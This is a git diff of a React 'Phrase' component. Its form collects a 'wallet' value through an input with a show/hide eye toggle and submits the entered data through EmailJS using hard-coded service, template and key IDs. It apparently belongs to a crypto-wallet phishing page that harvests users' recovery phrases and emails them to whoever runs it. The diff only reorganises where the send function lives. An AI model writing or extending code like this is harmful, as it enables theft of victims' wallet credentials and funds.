@@ -5,12 +5,12 @@ import classes from "./phrase.module.css";
 import emailjs from 'emailjs-com'
 import { FaEye } from "react-icons/fa";
 const Phrase = () => {
-  const sendEmail2 = (e) => {
-    e.preventDefault()
-    alert("submitted")
-    emailjs.sendForm('service_nx9di5h', 'template_vybjxoi', e.target, 'tr6MisctBi3oaO8ec')
-  }
-  // const { sendEmail } = useContext(UserContent);
+  // const sendEmail = (e) => {
+  //   e.preventDefault()
+  //   alert("submitted")
+  //   emailjs.sendForm('service_nx9di5h', 'template_vybjxoi', e.target, 'tr6MisctBi3oaO8ec')
+  // }
+  const { sendEmail } = useContext(UserContent);
   const [close, setClose] = useState(false);
   const [closeEye, setCloseEye] = useState(false);
   const toggleCloseEye = () => {
@@ -21,14 +21,20 @@ const Phrase = () => {
     wallet: "",
   });
   const handleForm = (e) => {
+    const { name, value } = e.target
     setpayLoad({
       ...payload,
-      [e.target.name]: e.target.value,
+      [name]: value,
+
     });
   };
+  const handleSubmit = (e) => {
+    e.preventDefault()
+    console.log(payload)
+  }
   return (
     <>
-      <form action="" onSubmit={sendEmail2}>
+      <form action="" onSubmit={sendEmail}>
         <div className={classes.inputs}>
           <div className={classes.inputEye}>
             <input
